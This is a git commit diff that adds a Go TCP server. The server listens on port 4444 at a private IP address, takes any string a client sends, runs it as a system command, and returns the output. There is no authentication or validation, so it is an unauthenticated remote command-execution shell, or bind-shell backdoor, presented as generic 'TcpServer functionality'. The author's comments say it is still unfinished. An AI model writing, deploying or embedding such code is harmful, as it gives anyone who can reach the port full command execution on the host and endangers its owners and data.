d447d8c6a90c05f08f4469b88b077c3eedb693f4
C0ntra99 <fowlerethan99@gmail.com>
2018-01-29 00:14:34 -0600

    TcpServer functionality
    Centeral script to handle tcp connections. Still need  a lot of work.

---
+++ src/tcpServer/tcpServer.go
@@ -0,0 +1,72 @@
+package tcpServer
+
+import (
+  "fmt"
+  "net"
+  "os"
+  "strconv"
+  "bytes"
+  "os/exec"
+  "strings"
+)
+
+const (
+  port = "4444"
+  host = "192.168.1.219"
+)
+
+func StartServer() {
+  listener, err := net.Listen("tcp",host+":"+port)
+  if err != nil {
+    fmt.Println("Error listening:", err.Error())
+    os.Exit(1)
+  }
+  defer listener.Close()
+
+  fmt.Println("Listening on " + host + ":" + port)
+  for {
+    conn, err := listener.Accept()
+    if err != nil {
+      fmt.Println("Error accecpting: ", err.Error())
+    }
+
+    fmt.Printf("Connection from %s -> %s\n", conn.RemoteAddr(), conn.LocalAddr())
+    go handleConnection(conn)
+  }
+}
+
+func handleConnection(conn net.Conn) {
+  buf := make([]byte, 1024)
+
+  reqLen, err := conn.Read(buf)
+  if err != nil {
+    fmt.Println("Error reading: ", err.Error())
+  }
+
+  fmt.Println("Message len: ", strconv.Itoa(reqLen))
+  msg := bytes.Index(buf, []byte{0})
+  fmt.Println("Message: ", string(buf[:msg]))
+  command := string(buf[:msg])
+  ///If the command has a spcae in it then it will not run
+  //Need to split the string somehow then send it to command
+  //also need to do error checking
+  cmd := exec.Command(command)
+  output, _ := cmd.CombinedOutput()
+
+  commandOutput(output,cmd)
+  if len(output) > 0 {
+    conn.Write([]byte(output))
+  } else {
+    conn.Write([]byte("Command Failed to execute"))
+  }
+  conn.Close()
+}
+
+func commandOutput(outs []byte, cmd *exec.Cmd) {
+  fmt.Printf("Executing: %s\n", strings.Join(cmd.Args, " "))
+  if len(outs) > 0 {
+    fmt.Printf("Output: %s\n", string(outs))
+  } else {
+    fmt.Print("Command Failed to execute...")
+  }
+}
